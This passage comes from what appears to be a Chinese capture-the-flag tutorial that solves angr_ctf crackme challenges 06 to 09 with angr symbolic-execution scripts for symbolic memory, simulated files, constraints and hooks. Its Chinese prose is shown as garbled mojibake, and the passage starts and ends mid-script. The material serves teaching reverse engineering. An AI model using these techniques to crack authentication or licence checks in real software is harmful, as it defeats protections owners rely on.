0x804938C # first insn after scanf()<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # set the buffer0&#x27;s and buffer1&#x27;s val to our specific address<br>    buf0_addr = 0x9B20684<br>    buf1_addr = 0x9B2068C<br>    fake_chunk0_addr = 0x1145140<br>    fake_chunk1_addr = 0x1919810<br>    init_state.memory.store(buf0_addr,fake_chunk0_addr, endness=proj.arch.memory_endness)<br>    init_state.memory.store(buf1_addr,fake_chunk1_addr, endness=proj.arch.memory_endness)<br>    <br>    # create symbolic vals and set fake_chunk to them<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 64) # 8 bytes = 64 bits<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 64) # 8 bytes = 64 bits<br>    init_state.memory.store(fake_chunk0_addr, password_0)<br>    init_state.memory.store(fake_chunk1_addr, password_1)<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x8049452, avoid = 0x8049440)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0, cast_to=bytes)<br>        solution_1 = solution_state.solver.eval(password_1, cast_to=bytes)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/6Oyk2cTxbDjpYVE.png" alt="image.png"></p><h2 id="07-angr-symbolic-fileï¼šç¬¦å·åŒ–æ–‡ä»¶">07_angr_symbolic_fileï¼šç¬¦å·åŒ–æ–‡ä»¶</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDA ä¸­ï¼Œå‘ç°å…¶ä¼šå…ˆè¯»å…¥ 64 å­—èŠ‚ï¼Œä¹‹åé€šè¿‡ <code>ignoreme()</code> å°†å…¶å†™å…¥ä¸€ä¸ªç‰¹å®šæ–‡ä»¶ä¸­ï¼Œå†ä»è¯¥æ–‡ä»¶ä¸­æŠŠè¾“å…¥è¯»å›æ¥ï¼Œä¹‹åå°±åˆæ˜¯å¸¸è§„çš„ complex æ“ä½œä¸€ç•ªåä¸ä¸€ä¸ªç‰¹å®šå­—ç¬¦ä¸²è¿›è¡Œæ¯”å¯¹</p><p><img src="https://s2.loli.net/2022/10/31/snWIloVkGtUxcdz.png" alt="image.png"></p><p>æ¯”è¾ƒå®¹æ˜“æƒ³åˆ°çš„æ–¹æ³•å°±æ˜¯<strong>ç›´æ¥ä»æ–‡ä»¶è¯»å…¥ç»“æŸåå¼€å§‹ä½œä¸ºåˆå§‹çŠ¶æ€</strong>ï¼Œä¹‹åç”¨ 05 çš„ç¬¦å·åŒ–å†…å­˜çš„æ–¹æ³•æ¥æ±‚è§£ï¼Œä¸è¿‡è¿™æ ·å°±ä¸æ˜¯è¿™é“é¢˜å‡ºé¢˜çš„ç›®çš„äº†ï¼šï¼‰</p><h3 id="Emulated-Filesystem-angr-çš„æ–‡ä»¶ç³»ç»Ÿ">Emulated Filesystem - angr çš„æ–‡ä»¶ç³»ç»Ÿ</h3><p>åœ¨ angr å½“ä¸­ä¸æ–‡ä»¶ç³»ç»Ÿé—´çš„æ“ä½œæ˜¯é€šè¿‡ <code>SimFile</code> å¯¹è±¡å®Œæˆçš„ï¼ŒSimFile ä¸ºå¯¹  <em>å­˜å‚¨</em>  çš„æŠ½è±¡æ¨¡å‹ï¼Œä¸€ä¸ª SimFile å¯¹è±¡å¯ä»¥è¡¨ç¤ºä¸€ç³»åˆ—çš„å­—èŠ‚ã€ç¬¦å·ç­‰</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>angr.SimFile()</code> æ¥åˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿæ–‡ä»¶ï¼Œåˆ›å»ºå¸¦æœ‰å…·ä½“å€¼ä¸ç¬¦å·å˜é‡çš„ SimFile ğŸŒ°å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr, claripy<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file = angr.SimFile(<span class="hljs-string">&#x27;a_file&#x27;</span>, content = <span class="hljs-string">&quot;flag&#123;F4k3_f1@9!&#125;\n&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file2 = angr.SimFile(<span class="hljs-string">&#x27;another_file&#x27;</span>, bvs, size=<span class="hljs-number">8</span>) <span class="hljs-comment"># size in bytes there</span><br></code></pre></td></tr></table></figure><p>æ¨¡æ‹Ÿæ–‡ä»¶éœ€è¦ä¸ç‰¹å®šçš„çŠ¶æ€è¿›è¡Œå…³è”ï¼Œé€šè¿‡ <code>state.fs.insert(sim_file)</code> æˆ– <code>sim_file.set_state(state)</code> æˆ‘ä»¬å¯ä»¥å°† SimFile æ’å…¥åˆ°ä¸€ä¸ªçŠ¶æ€çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.fs.insert(<span class="hljs-string">&#x27;test_file&#x27;</span>, sim_file)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>pos = <span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>data, actural_read, pos = sim_file.read(pos, <span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure><p>å¯¹äº  <em>æµ</em>  ï¼ˆStreamsï¼Œä¾‹å¦‚æ ‡å‡†IOã€TCPè¿æ¥ç­‰ï¼‰ç±»å‹çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ <code>angr.SimPackets()</code> æ¥åˆ›å»ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet = angr.SimPackets(<span class="hljs-string">&#x27;my_packet&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet<br>&lt;angr.storage.file.SimPackets <span class="hljs-built_in">object</span> at <span class="hljs-number">0x7f75626a2e80</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-4">FINAL EXPLOIT</h3><p>é‚£ä¹ˆæœ¬é¢˜å®é™…ä¸Šæ˜¯è®©æˆ‘ä»¬åˆ©ç”¨ angr æ¥åˆ›å»ºä¸€ä¸ª<strong>æ¨¡æ‹Ÿæ–‡ä»¶</strong>ä»¥æ¨¡æ‹Ÿè¯»å–æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œè¿™é‡Œæˆ‘ä»¬å°†åˆå§‹çŠ¶æ€è®¾ä¸ºä»æ‰“å¼€æ–‡ä»¶å¼€å§‹ï¼Œä¹‹ååˆ›å»ºä¸€ä¸ªä½å‘é‡ç¬¦å·æ”¾å…¥æ¨¡æ‹Ÿæ–‡ä»¶å¹¶å°†æ¨¡æ‹Ÿæ–‡ä»¶æ’å…¥æ–‡ä»¶ç³»ç»Ÿï¼Œä¹‹åæ¢ç´¢åˆ°å¯¹åº”çŠ¶æ€åæ±‚è§£å³å¯ï¼Œè§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Good Job.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./07_angr_symbolic_file&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_address = <span class="hljs-number">0x8049550</span> <span class="hljs-comment"># first insn returned from ignoreme()</span><br>    init_state = proj.factory.blank_state(addr = start_address)<br><br>    <span class="hljs-comment"># create BVS and SimFile</span><br>    file_size = <span class="hljs-number">0x40</span><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, file_size * <span class="hljs-number">8</span>) <span class="hljs-comment"># 0x40 bytes</span><br>    file_name = <span class="hljs-string">&#x27;KBECVEJF.txt&#x27;</span><br>    sim_file = angr.storage.SimFile(file_name, password, size = file_size)<br><br>    <span class="hljs-comment"># load the SimFile</span><br>    init_state.fs.insert(file_name, sim_file)<br><br>    <span class="hljs-comment"># solve it</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution = solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Could not find the solution&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/lTfoUMzQANGSbnH.png" alt="image.png"></p><h1>0x03. angr-ctfï¼šçº¦æŸæ¡ä»¶</h1><h2 id="08-angr-constraintsï¼šæ·»åŠ çº¦æŸ">08_angr_constraintsï¼šæ·»åŠ çº¦æŸ</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œè¿˜æ˜¯è¯»å…¥è¾“å…¥å complex å‡½æ•°å¤„ç†åè¿›è¡Œæ¯”å¯¹çš„æ¨¡å¼ï¼Œè¿™é‡Œçš„ <code>0x804C040</code> å°±æ˜¯ <code>buffer</code> çš„åœ°å€ï¼Œä¸è¿‡å…¶è‡ªå®šä¹‰äº†ä¸€ä¸ªå¯¹æ¯”å‡½æ•°ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/4DXMH3GIQdiZOwC.png" alt="image.png"></p><p>è‡ªå®šä¹‰çš„å¯¹æ¯”å‡½æ•°æ¯”è¾ƒå¸¸è§„ï¼Œå…¶ä¸­çš„ <code>0x804C030</code> ä¾¿æ˜¯ <code>password</code> çš„åœ°å€ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/sxXtqvHYyiN5COg.png" alt="image.png"></p><p>åœ¨ <code>check_equals_xx()</code> å‡½æ•°å½“ä¸­ç”±äºå…¶é€‰æ‹©äº†é€å­—ç¬¦æ¯”è¾ƒåå¢åŠ è®¡æ•°çš„æ¯”è¾ƒæ–¹å¼çš„ç¼˜æ•…ï¼Œä¼šå¯¼è‡´ <strong>è·¯å¾„çˆ†ç‚¸</strong>ï¼ˆpath explosionï¼‰çš„é—®é¢˜</p><h3 id="angr-ä¸­çš„çº¦æŸ">angr ä¸­çš„çº¦æŸ</h3><p>å‰é¢æˆ‘ä»¬è®²åˆ°ä½å‘é‡ä¹‹é—´å¯ä»¥è¿›è¡Œè¿ç®—ï¼Œç±»ä¼¼åœ°ï¼Œä½å‘é‡ä¹‹é—´ä¹Ÿå¯ä»¥è¿›è¡Œ<strong>æ¯”è¾ƒè¿ç®—</strong> ï¼Œå…¶ç»“æœä¸º <code>Bool</code> ç±»å‹çš„å¯¹è±¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv == bvv2<br>&lt;Bool <span class="hljs-literal">True</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs == bvv + bvv2<br>&lt;Bool bvs_0_32 == <span class="hljs-number">0xbd5b7dde</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&#x27;bvs2&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 &gt; bvs * bvv + bvv2<br>&lt;Bool bvs2_1_32 &gt; bvs_0_32 * <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure><p>å¯¹äºå¸¦æœ‰ç¬¦å·å€¼çš„æ¯”è¾ƒè€Œè¨€ï¼Œ <code>Bool</code> ç±»å‹çš„å¯¹è±¡ç›´æ¥è¡¨ç¤ºäº†å¯¹åº”çš„å¼å­ï¼Œå› æ­¤å¯ä»¥ä½œä¸º<strong>çº¦æŸæ¡ä»¶</strong>è¢«æ·»åŠ åˆ°ä¸€ä¸ªçŠ¶æ€å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>state.solver.add()</code> ä¸ºå¯¹åº”çŠ¶æ€æ·»åŠ çº¦æŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs == bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs2 &gt; bvs * bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.<span class="hljs-built_in">eval</span>(bvs2) <span class="hljs-comment"># get the concrete value under constraints</span><br></code></pre></td></tr></table></figure><p>é™¤äº† Bool ç±»ä»¥å¤–ï¼ŒClaripy è¿˜æä¾›äº†ä¸€äº›ä»¥ä½å‘é‡ä½œä¸ºç»“æœçš„è¿ç®—æ“ä½œï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªğŸŒ°ï¼ˆå®Œæ•´çš„è¿˜æ˜¯å»è¯»<a href="https://docs.angr.io/advanced-topics/claripy">æ–‡æ¡£</a>å§ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>claripy.If(bvs == bvs2, bvs, bvs2)<br>&lt;BV32 <span class="hljs-keyword">if</span> bvs_0_32 == bvs2_1_32 then bvs_0_32 <span class="hljs-keyword">else</span> bvs2_1_32&gt;<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-5">FINAL EXPLOIT</h3><p>ç”±äºå¾…æ¯”è¾ƒå­—ç¬¦ä¸²æ˜¯å›ºå®šçš„ï¼Œæ•…æˆ‘ä»¬å¯ä»¥è®© <code>explore()</code> åœ¨å®Œæˆå¯¹è¾“å…¥çš„å˜æ¢åã€åœ¨è¿›å…¥æ¯”è¾ƒå‡½æ•°ä¹‹å‰åœä¸‹ï¼Œä¹‹åç›´æ¥ä¸ºè¯¥çŠ¶æ€æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªå¯¹åº”çš„çº¦æŸåè¿›è¡Œæ±‚è§£å³å¯</p><p>è¿™é‡Œæ·»åŠ çº¦æŸçš„æ–¹æ³•æ˜¯ä½¿ç”¨ <code>state.memory.load(addr, size_in_bytes)</code> æˆå‘˜å‡½æ•°å°†å½“å‰çŠ¶æ€çš„æŸä¸ªå†…å­˜åŒºåŸŸä½œä¸ºä¸€ä¸ª BVS æå–å‡ºæ¥ï¼Œä¹‹åé€šè¿‡ <code>state.add_constraints(condition)</code> æ·»åŠ çº¦æŸæŒ‡å®šè¯¥å—å†…å­˜åœ¨å½“å‰çŠ¶æ€ä¸‹çš„å€¼ä¸ºç‰¹å®šå­—ç¬¦ä¸²ï¼Œæœ€åä½¿ç”¨ <code>state.solver.eval()</code> æ±‚è§£åŸæ¥çš„ buffer å³å¯</p><p>æœ€ç»ˆçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼Œè¯¦è§æ³¨é‡Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./08_angr_constraints&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_addr = <span class="hljs-number">0x804935D</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    <span class="hljs-comment"># BVS for buffer</span><br>    buffer_addr = <span class="hljs-number">0x804C040</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># explore to check_equals()</span><br>    check_addr = <span class="hljs-number">0x80493A9</span> <span class="hljs-comment"># last insn before call check_equals() </span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = check_addr)<br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-comment"># get the buffer BVS of check_state</span><br>    password = check_state.memory.load(buffer_addr, buffer_size)<br>    compared_str = <span class="hljs-string">&quot;EFJLFOGMURLEVNXN&quot;</span><br><br>    <span class="hljs-comment"># add and solve the constraints</span><br>    check_state.add_constraints(password == compared_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/11/01/Lh5YzU3RPyD2ZTW.png" alt="image.png"></p><h1>0x04. angr-ctfï¼šå‡½æ•°æ“ä½œ</h1><h2 id="09-angr-hooksï¼šå‡½æ•°æ›¿æ¢">09_angr_hooksï¼šå‡½æ•°æ›¿æ¢</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œç¨‹åºå¤§æ¦‚çš„ä¸»ä½“é€»è¾‘æ˜¯è¯»å…¥ buffer åç»è¿‡ <code>complex_function()</code> è¿ç®—ï¼Œä¹‹åé€šè¿‡ <code>check_equals()</code> ä¸ password è¿›è¡Œå¯¹æ¯”å¹¶æŠŠç»“æœå­˜åˆ° <code>equals</code> å˜é‡å½“ä¸­ï¼›ä¹‹åå°† password ç»è¿‡ <code>complex_function()</code> è¿ç®—ï¼Œéšåå†è¯»å…¥ buffer ä¸ password è¿›è¡Œå¯¹æ¯”ï¼›ä¸¤ä¸ªæ¡ä»¶éƒ½ç¬¦åˆäº†æ‰ä¼šè¾“å‡º <code>&quot;Good Job.&quot;</code></p><p>å…¶ä¸­ <code>0x804C044</code> å°±æ˜¯ buffer çš„åœ°å€ï¼Œ<code>0x804C034</code> å°±æ˜¯ password çš„åœ°å€</p><p><img src="https://s2.loli.net/2022/11/02/sIjxptNAr7ZCeuo.png" alt="image.png"></p><p>å…¶ä¸­ <code>check_equals()</code> é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå°±ç®—ç®€å•çš„ä¸ password è¿›è¡Œå¯¹æ¯”ï¼Œä¸è¿‡ç”±äºæ˜¯<strong>é€å­—ç¬¦å¯¹æ¯”</strong>åå¢åŠ ç»Ÿè®¡æ•°é‡ï¼Œå› æ­¤ä¼šå¯¼è‡´<strong>è·¯å¾„çˆ†ç‚¸</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/11/02/5NAMaSsoHVZ4geL.png" alt="image.png"></p><p>å¦‚æœæ˜¯åƒ 02 é‚£æ ·ç›´æ¥æ±‚è§£ï¼Œ<code>check_equals()</code> å¸¦æ¥çš„è·¯å¾„çˆ†ç‚¸ä¼šéå¸¸ä»¤äººå¤´å¤§ï¼Œè€Œè¯¥å‡½æ•°çš„åŠŸèƒ½æœ¬è´¨ä¸Šå°±ä»…æ˜¯ä¸ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥<strong>ä½¿ç”¨ angr æ¥ hook æ‰è¯¥å‡½æ•°ï¼Œè‡ªè¡Œå®ç°ç­‰ä»·çš„æ“ä½œå‡½æ•°</strong></p><h3 id="project-hook-å‡½æ•°é’©å­">project.hook() - å‡½æ•°é’©å­</h3><p>æœ‰çš„æ—¶å€™æˆ‘ä»¬ä¼šæœ‰éœ€è¦ hook æ‰æŸä¸ªå‡½æ•°çš„éœ€æ±‚ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>project.hook(addr = call_insn_addr, hook = my_function, length = n)</code> æ¥ hook æ‰å¯¹åº”çš„ call æŒ‡ä»¤ï¼Œå…¶ä¸­ <code>call_insn_addr</code> ä¸º call æŒ‡ä»¤çš„åœ°å€ï¼Œ<code>my_function</code> ä¸ºæˆ‘ä»¬çš„è‡ªå®šä¹‰å‡½æ•°ï¼Œ <code>length</code> ä¸º call æŒ‡ä»¤çš„é•¿åº¦ï¼š</p><p><img src="https://s2.loli.net/2022/11/02/Y5ptBU8oAsTdj7c.png" alt="image.png"></p><p>æˆ‘ä»¬çš„è‡ªå®šä¹‰å‡½æ•°åº”å½“ä¸ºæ¥æ”¶ <code>state</code> ä½œä¸ºå‚æ•°çš„å‡½æ•°ï¼Œangr è¿˜æä¾›äº† decorator è¯­æ³•ç³–ï¼Œå› æ­¤ä»¥ä¸‹ä¸¤ç§å†™æ³•éƒ½å¯ä»¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># method 1</span><br><span class="hljs-meta">@project.hook(<span class="hljs-params"><span class="hljs-number">0x1234</span>, length=<span class="hljs-number">5</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br><br><span class="hljs-comment"># method 2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func2</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br>proj.hook(addr = <span class="hljs-number">0x5678</span>, hook = my_hook_func2, length = <span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-6">FINAL EXPLOIT</h3><p>å› æ­¤æœ¬é¢˜æˆ‘ä»¬åªéœ€è¦ hook æ‰æ¯”è¾ƒå‡½æ•°ä¾¿èƒ½è§£å†³è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>claripy.If()</code> åˆ›å»ºä¸€ä¸ªæ¯”è¾ƒå¹¶å°†å€¼ç»™åˆ° eax å¯„å­˜å™¨ä½œä¸ºè¿”å›å€¼ï¼Œæœ€åå°±æ˜¯å¸¸è§„çš„å†…å­˜ç¬¦å·åŒ–åæ±‚è§£å³å¯ï¼Œæœ€ç»ˆçš„æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    start_addr = <span class="hljs-number">0x804937D</span> <span class="hljs-comment"># first insn after first scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># because we have passed the qmemcpy() that initial the password&#x27;s memory,</span><br>    <span class="hljs-comment"># so we need to do it manually</span><br>    password_size = <span class="hljs-number">0x10</span><br>    password_addr = <span class="hljs-number">0x804C034</span><br>    init_state.memory.store(password_addr,<br>                            claripy.BVV(<span class="hljs-built_in">int</span>.from_bytes(compared_str, <span class="hljs-string">&quot;big&quot;</span>), <br>                                        password_size * <span class="hljs-number">8</span>))<br><br><span class="hljs-meta">    